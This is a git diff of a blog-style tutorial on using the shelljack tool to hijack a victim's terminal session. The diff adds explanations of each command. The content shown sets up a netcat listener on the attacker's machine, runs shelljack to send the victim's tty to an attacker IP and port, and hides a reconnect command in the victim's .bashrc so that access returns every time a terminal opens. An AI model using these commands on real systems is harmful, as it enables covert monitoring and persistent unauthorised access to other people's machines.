@@ -27,6 +27,8 @@ cd shelljack
 make
 ```
 
+With these commands we compile shelljack dependencies.
+
 ## [](#header-2)Simple attack
 
 We have everything ready, now we are going to test that everything is ok before creating the persistence.
@@ -37,12 +39,16 @@ In the attacker's machine we set up a listener:
 nc -lvp Port
 ```
 
-Now in the victim's machine we have to know the PID of the tty and execute shelljack:
+With this command we are setting up a listener with -l, putting the command in verbose with -v and with -p we are setting up the port.
+
+Now in the victim's machine we have to know the PID (proccess ID) of the tty because shelljack needs it and then execute shelljack:
 
 ```bash
 tty
 ./shelljack -n Attacker IP:Port $$
 ```
+
+With this command we are executing shelljack to connect us to that IP and that port.
 
 ![](https://raw.githubusercontent.com/M4luk0/m4luk0.github.io/master/images/victim_poc.png)
 
@@ -64,4 +70,4 @@ To apply the persistence we have to modify .bashrc in the victim's machine and a
 tty &>/dev/null; /home/code/shelljack/shelljack -n Attacker IP:Port $$ &>/dev/null
 ```
 
-Now, everytime the victim logs in the machine, if we have the listener, he is going to connect us.
+What is inside .bashrc will be executed every time the user opens a terminal, so if we put the command to connect with shelljack, we will get persistence.
